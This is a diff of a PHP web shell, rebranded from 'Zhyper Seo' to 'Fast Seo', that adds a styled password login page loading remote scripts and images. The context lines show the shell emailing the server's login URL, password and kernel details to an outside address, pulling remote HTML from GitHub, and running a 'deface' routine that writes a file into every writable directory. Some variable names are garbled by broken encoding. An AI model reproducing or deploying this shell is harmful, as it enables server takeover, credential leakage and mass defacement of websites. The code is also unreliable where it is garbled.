+<a><font color="maroon"><img src="https://zhyper-shel.info/imgzhyper/hazard.png" width="50" height="50"></font></font></a>
+
+<script type="text/javascript" src="https://nathanprinsley-files.prinsh.com/data-1/js/efek-salju-faisal.js" /></script>
+<script type="text/javascript">
+snowStorm.snowColor = '#6bd';
+snowStorm.flakesMaxActive = 96;
+snowStorm.useTwinkleEffect = true;
+</script>
+<div class="main-box">
+    <form action="" method="post">
+        <div class="login">
+            <div id="loginBox" class="login-box">
+                <input type="password" name="pass" placeholder="Password" required>
+                <input type="submit" name="submit" value="Gass">
+            </div>
+        </div>
+    </form>
+</div>
+<style>
+    *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+
+    }
+    @property --rot{
+        syntax: '<angle>';
+        inherits: false;
+        initial-value: 0deg;
+    }
+    body{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #000
+    }
+    .main-box{
+        position: relative;
+        width: 450px;
+        height: 200px;
+        background: repeating-conic-gradient(from var(--rot), rgb(0, 247, 255) 0%, rgb(123, 251, 255) 5%, transparent 5%, transparent 40%, rgb(255, 255, 255) 50%   );
+        filter: drop-shadow(0 15px 50px #000);
+        border-radius: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: rotation 4s linear infinite;
+        transition: 0.5s;
+        margin: 10px 10px;
+    }
+
+    @keyframes rotation {
+        0%{
+          --rot: 0deg;
+        }
+        100%{
+            --rot: 360deg;
+        }
+    }
+
+    .main-box::before{
+        content: '';
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        filter: drop-shadow(0 15px 50px #000);
+        border-radius: 20px;
+        animation: rotation 4s linear infinite;
+        animation-delay: 0.9s;
+    }
+    .main-box::after{
+        content: '';
+        position: absolute;
+        inset: 4px;
+        background: #000000;
+        border-radius: 15px;
+        border: 8px solid #000000;
+    }
+    .login{
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        inset: 60px;
+        flex-direction: column;
+        border-radius: 10px;
+        background: rgb(0, 0, 0);
+        box-shadow: inset 0 10px 20px rgb(19, 19, 19);
+        z-index: 1000;
+        color: rgb(255, 255, 255);
+        overflow: hidden;
+        inset: 40px;
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+
+
+
+    .login-box, .login-shell-box{
+        position: relative;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        gap: 20px;
+        width: 70%;
+        transition: 0.5s;
+    }
+
+
+    .login-box h2, .login-shell-box h2{
+        text-transform: uppercase;
+        font-weight: 600;
+        font-size: 22px;
+        letter-spacing: 0.2em;
+        text-align: center;
+    }
+    .login-box h2 i, .login-shell-box h2 i{
+        color: rgb(212, 2, 2);
+        text-shadow: 0 0 5px #ff2770, 0 0 25px #ff2770;
+    }
+    .login-box input, .login-shell-box input{
+        width: 100%;
+        padding: 10px 20px;
+        outline: none;
+        font: 1em;
+        color: #ffffff;
+        background: rgb(0, 0, 0);
+        border: 2px solid #ffffff3b;
+        border-radius: 30px;
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+    .login-box input::placeholder, .login-shell-box input::placeholder{
+        color: #999;
+    }
+    .login-box input[type="submit"], .login-shell-box input[type="submit"]{
+        background: rgb(0, 0, 0);
+        border: none;
+        font-weight: 500;
+        cursor: pointer;
+        transition: 0.5s;
+        color: #fff;
+    }
+    .login-box input[type="submit"]:hover{
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+    .login-group{
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .login-group a{
+        color: white;
+        text-decoration: none;
+    }
+    .login-group a:nth-child(2){
+        color: rgb(212, 2, 2);
+        font-weight: 600;
+        cursor: pointer;
+    }
+
+    .login-shell-box{
+        display: none;
+    }
+</style>
+	<?php
+	exit;
+	}
 	?>
 	<?php
 	echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/190index.html"); // Alert for update
@@ -204,9 +555,9 @@ $Array = [
 	echo "
 	<html>
 	<head>
-		<title>Zhyper Seo</title>
+		<title>Fast Seo</title>
 		<meta charset='UTF-8'>
-		<meta name='author' content='Zhyper Seo'>
+		<meta name='author' content='Fast Seo'>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
 		<link rel='icon' href='https://chat.openai.com/apple-touch-icon.png'>
 		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
@@ -245,7 +596,7 @@ $Array = [
 	<div class='container-fluid'>
 	<div class='py-3' id='main'>
 		<div class='box shadow bg-dark p-4 rounded-3'>
-			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>Zhyper Seo</h4></a>";
+			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>Fast Seo</h4></a>";
 			if(isset($_7['path'])){
 				$path = unhex($_7['path']);
 				chdir($path);
@@ -455,7 +806,7 @@ $Array = [
 		$server_name = $_SERVER['SERVER_NAME'];
 		$php_self = $_SERVER['PHP_SELF'];
 		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
-		@mail('Zhyper Seo@gmail.com', 'Hehehe', $report_bug);
+		@mail('Fast Seo@gmail.com', 'Hehehe', $report_bug);
 		}
 		if($_7['id'] == 'deface'){
 		function mass_all($dir,$namefile,$contents_sc) {
@@ -463,17 +814,17 @@ $Array = [
 			$dira = scandir($dir);
 			foreach($dira as $dirb) {
 				$dirc = "$dir/$dirb";
-				$▚ = $dirc.'/'.$namefile;
+				$â–š = $dirc.'/'.$namefile;
 				if($dirb === '.') {
-					$fungsi[2]($▚, $contents_sc);
+					$fungsi[2]($â–š, $contents_sc);
 				} elseif($dirb === '..') {
-					$fungsi[2]($▚, $contents_sc);
+					$fungsi[2]($â–š, $contents_sc);
 				} else {
 					if($fungsi[1]($dirc)) {
 						if(is_writable($dirc)) {
-							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
-							$fungsi[2]($▚, $contents_sc);
-							$▟ = mass_all($dirc,$namefile,$contents_sc);
+							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$â–š<br>";
+							$fungsi[2]($â–š, $contents_sc);
+							$â–Ÿ = mass_all($dirc,$namefile,$contents_sc);
 							}
 						}
 					}
@@ -485,16 +836,16 @@ $Array = [
 				$dira = scandir($dir);
 				foreach($dira as $dirb) {
 					$dirc = "$dir/$dirb";
-					$▚ = $dirc.'/'.$namefile;
+					$â–š = $dirc.'/'.$namefile;
 					if($dirb === '.') {
-						$fungsi[2]($▚, $contents_sc);
+						$fungsi[2]($â–š, $contents_sc);
 					} elseif($dirb === '..') {
-						$fungsi[2]($▚, $contents_sc);
+						$fungsi[2]($â–š, $contents_sc);
 					} else {
 						if($fungsi[1]($dirc)) {
 							if(is_writable($dirc)) {
 								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
-								$fungsi[2]($▚, $contents_sc);
+								$fungsi[2]($â–š, $contents_sc);
 							}
 						}
 					}
@@ -1651,7 +2002,7 @@ Allow from all
 		?>
 		</tbody>
 		</table>
-		</div><div class='text-secondary'>Zhyper Seo</div>
+		</div><div class='text-secondary'>FAST SEO</div>
 	</div>
 </div>
 </body>
